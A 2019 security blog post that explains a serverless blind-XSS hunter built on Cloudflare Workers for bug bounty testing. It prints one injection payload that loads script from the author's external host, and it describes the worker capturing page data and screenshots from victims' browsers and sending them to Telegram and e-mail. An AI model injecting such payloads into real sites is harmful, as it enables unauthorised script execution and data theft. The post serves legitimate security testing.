---
layout: post
title: "Serverless Blind XSS hunter with Cloudflare Workers"
date: 2019-09-11 00:00:00 -0000
categories: ['Security research', 'Tools', 'Bug bounty']
tags: [blind xss, cloudflare, cloudflare worker, serverless, xss, xss hunter]
author: vavkamil
redirect_from:
  - /2019/09/11/serverless-blind-xss-hunter-with-cloudflare-workers/
---

<hr>
<p>
    If you are not familiar with <strong><a href="https://xsshunter.com/" target="_blank">XSS Hunter</a></strong> by <a href="https://twitter.com/IAmMandatory" target="_blank">@IAmMandatory</a>, it's an awesome tool for penetration testers and bug bounty hunters that allows easily hunt for blind XSS vulnerabilities. It's <a href="https://github.com/mandatoryprogrammer/xsshunter"
    target="_blank">open-source</a> with a ton of features. You can use the SaaS version, <a href="https://thehackerblog.com/xss-hunter-is-now-open-source-heres-how-to-set-it-up/"
    target="_blank">deploy it yourself</a> or even go serverless! You should absolutely give it a try :)
</p>

---
<p>
    I was thinking about writing something similar for a while. I just wanted something way simpler, where I could experiment with different payloads, CSP bypasses and other stuff. Right now it can grab basic info about the visitor and website, take a screenshot and notify me on Telegram and E-mail. If you are fancier, you can easily add support for Slack or Discord notifications ...
</p>
<p>
    <strong>TLDR;</strong> I did a simple XSS hunter as a Cloudflare Worker, source code is here:
    <br>
    <a href="https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e"
       target="_blank">https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e</a>
</p>
<center>
    <img src="{{ '/assets/img/2019/09/Screenshot_20190911-142246_Telegram.png' | relative_url }}"
         alt=""
         title="Telegram notification" />
    <img src="{{ '/assets/img/2019/09/Screenshot-from-2019-09-11-14-28-00.png' | relative_url }}"
         alt=""
         title="E-mail notification" />
    <img src="{{ '/assets/img/2019/09/Screenshot-from-2019-09-11-14-28-23.png' | relative_url }}"
         alt=""
         title="Screenshot example" />
</center>
<p>
    Example: <a target="_blank"
    href="https://twitter.com/vavkamil/status/1171460639434276869">https://twitter.com/vavkamil/status/1171460639434276869</a>
    <p>
        <h3>WTF is CF Worker?</h3>
        <p>
            Cloudflare Workers are cheap and powerful service, where you can deploy serverless code all around the world. That allows you to create entirely new applications that behave similar to JavaScript in the browser. Using a CF Worker, you can modify your site’s HTTP requests and responses, make parallel requests, or generate responses from the edge.
        </p>
        <h3>Getting started</h3>
        <p>
            Assuming you already have Cloudflare account, just select any domain and start right away, or you can create custom <a rel=" href="https://workers.dev" target="_blank">workers.dev</a> subdomain. Once finished, you can start hunting for blind XSS with simple payload e.g.: </p> <pre><code>'">&lt;script src=//xss.vavkamil.cz/blind.js>&lt;/script></code></pre>
            <p>
                With paid Cloudflare plan, please highly consider using <a href="https://blog.cloudflare.com/building-with-workers-kv/"
    target="_blank">Workers KV</a> (Key-Value Store) for storing secrets.
            </p>
            <br>
            <p>
                Starting with Telegram, you will need to create a bot and get the API token. It's <a href="https://core.telegram.org/bots#3-how-do-i-create-a-bot"
    target="_blank">really easy</a>, just talk to <a href="https://telegram.me/botfather" target="_blank">@BotFather</a> and give it a name. Next, you will need to provide the bot with your user ID. Just talk to <a href="https://telegram.me/RawDataBot" target="_blank">@RawDataBot</a> or <a href="https://telegram.me/userinfobot" target="_blank">@userinfobot</a> and they will respond with your ID.
            </p>
            <br>
            <p>
                To be able to send e-mails, my best recommendation is to use <a href="https://www.mailgun.com/" target="_blank">Mailgun</a>. I'm really happy with the service that they are offering and you can configure it in 5 minutes (too lazy to write a step-by-step guide). Great for simulated phishing awareness too :)
            </p>
            <br>
            <p>
                The last part of the secrets is your Cloudflare worker route. Decide which path you want to use, once you are finished, create the route and pair the worker with it.
            </p>
            <br>
            <p>
                There comes the interesting stuff. Our blind.js script can behave differently based on the GET/POST requests and parameters. If it receives POST data from successful blind XSS attack, it will pass info about the website along with the screenshot to Telegram and e-mail.
            </p>
            <br>
            <p>
                I had some problems with message limits on Telegram side due to a huge base64 encoded strings, so I'm just sending basic notification and more detailed info is send to e-mail.
            </p>
            <br>
            <p>Sending messages from Telegram bot is very easy, you can even use HTML/markdown or just a plain text.</p>
            <p>Same goes for Mailgun, just pass the basic HTTP auth headers and you are good to go.</p>
            <p>You can even send a response to your victim after the successful execution :)</p>
            <p>When the Workers route is requested via GET, there are three possibilities what can happen.</p>
            <br>
            <p>
                With the <strong>base64</strong> parameter, it will decode the string and respond with the screenshot. I have implemented it this way because at the time it's not possible to do stuff with files or buffer, but it would be way more elegant to just send the screenshot as an attachment ...
            </p>
            <br>
            <p>
                This part is bothering me. To be able to do a screenshot of the victim's browser, you need to somehow serve html2canvas.min.js. With <strong>html2canvas=1</strong> parameter, it will do just that. This way it's possible to get the content from 3rd party domain and serve it from our origin, but it's a huge privacy risk. I was thinking about it and will probably just leverage Cloudflare cache and add hash checking mechanism to notice changes in the remote code.
            </p>
            <br>
            <p>
                And the last part is the most important one. This is the payload that will be injected everywhere :) It will inject <strong>html2canvas.min.js</strong> and after the screenshot is ready, POST request with the data is fired to the worker to process.
            </p>
            <br>
            <p>I hope that it's not a total garbage script and somebody will appreciate it :) Have a lucky bug hunting!</p>
            <br>
            <p>
                PoC: <a href="https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e">https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e</a>
            </p>
            <script src="https://gist.github.com/vavkamil/d40e3b8dd1373445506517684959531e.js"></script>
